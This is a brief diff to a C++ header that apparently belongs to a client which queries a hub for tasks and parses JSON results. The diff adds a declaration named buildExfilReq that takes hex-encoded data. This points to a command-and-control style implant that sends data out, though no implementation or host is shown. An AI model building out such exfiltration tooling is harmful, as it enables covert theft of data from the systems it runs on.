@@ -6,4 +6,5 @@ public:
     // Renamed to specifically target our Hub's task slot
     static std::string buildTaskQueryReq();
     static std::string extractResults(const std::string& jsonResponse);
+    static std::string buildExfilReq(const std::string& hexData);
 };
